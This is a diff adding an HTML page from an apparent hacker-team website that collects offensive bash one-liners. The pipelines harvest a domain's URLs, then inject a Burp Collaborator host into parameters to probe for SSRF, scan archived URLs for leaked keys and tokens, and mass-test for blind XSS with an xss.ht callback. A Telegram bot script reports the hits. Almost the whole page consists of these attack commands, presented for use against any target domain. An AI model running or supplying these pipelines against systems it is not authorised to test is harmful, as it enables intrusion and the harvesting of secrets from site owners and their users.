@@ -1,0 +1,70 @@
+<html>
+<meta http-equiv="Content-Type" content="text/html;charset=UTF-8"> 
+<head>
+	<title>Viloid Box</title>
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<link href="assets/css/style.css" rel="stylesheet" type="text/css" media="screen">
+	<link href="assets/css/prism.css" rel="stylesheet" type="text/css">
+</head>
+
+<body>
+	<div id="container">
+		<div id="header">
+			<pre class="logo"><code>  	  / _ \
+	\_\(_)/_/	 What you spend years creating, 
+	 _//"\\_  		Others could destroy overnight.
+	  /   \</code></pre>
+		
+			<hr>
+			$ cd 
+		  	<a href="index.html">~/</a> <a href="project.html">Projects/</a> <a href="oneliner.html">OneLiner/</a> <a href="about.html">About/</a>	  	
+	  	</div>
+
+	  	<div id="content">
+
+			<h3><b>[<u>~/OneLiner</u>]</b> $ ls</h3>
+			
+			<div id="cans">
+			# Collecting urls + test ssrf
+				<pre><code class="language-bash">▶ gau domain.com | urlive | grep -E '(callback=|jsonp=|api_key=|api=|password=|email=|emailto=|token=|username=|csrf_token=|unsubscribe_token=|p=|q=|query=|search=|id=|item=|page_id=|secret=|url=|from_url=|load_url=|file_url=|page_url=|file_name=|page=|folder=|folder_urllogin_url=|img_url=|return_url=|return_to=|next=|redirect=|redirect_to=|logout=|checkout=|checkout_url=|goto=|next_page=|file=|load_file=|cmd=|ip=|ping=|lang=|edit=|LoginId=|size=|signature=|passinfo=)' | qsreplace EnterYourBurpCollabrator | concurl</code></pre>
+			</div>
+		
+			<div id="cans">
+			# Collecting urls + search sensitive keys/token/secret
+				<pre><code class="language-bash">▶ echo domain.com | waybackurls | urlive | xkeys</code></pre>
+			</div>
+
+			<div id="cans">
+			# Collecting urls + test XSS + telegram notification
+				<pre><code class="language-bash">▶ echo domain.com | waybackurls | grep "=" | grep -v "png\|jpg\|js\|css\|gif\|txt" | qsreplace | dalfox pipe --blind https://{username}.xss.ht --found-action "./tele.sh @@query@@ @@type@@"</code></pre>
+				$ vi tele.sh
+				<pre><code class="language-bash line-numbers">#!/usr/bin/env bash
+# By Viloid ~ Sec7or Team
+id="idRecipient"
+token="TelegramBotToken"
+waktu=$(date '+%d/%m/%Y-%H:%M:%S')
+if [ $2 == "VULN" ]; then
+	curl -s "https://api.telegram.org/bot$token/sendMessage" \
+	-H 'Content-Type: application/json' \
+	-d '{"chat_id": "'$id'", "text": "[XSS - Verified - '$waktu']\n\n[+] Query : '$1'\n"}'
+else
+	curl -s "https://api.telegram.org/bot$token/sendMessage" \
+	-H 'Content-Type: application/json' \
+	-d '{"chat_id": "'$id'", "text": "[XSS - Check - '$waktu']\n\n[+] Query : '$1'\n"}'
+fi</code></pre>
+			</div>
+		</div>
+
+		<div id="footer">
+			2020 | <a href="https://twitter.com/Verry__D">./verry__d</a> | rincans.io <br>Sec7or Team ~ Surabaya HackerLink
+		</div>
+	</div>
+</body>
+
+<script type="text/javascript">
+	var colors = ['magenta', 'lime', 'white', 'orange'];
+	document.body.style.color = colors[Math.floor(Math.random() * colors.length)];
+</script>
+<script src="assets/js/prism.js"></script>
+
+</html>
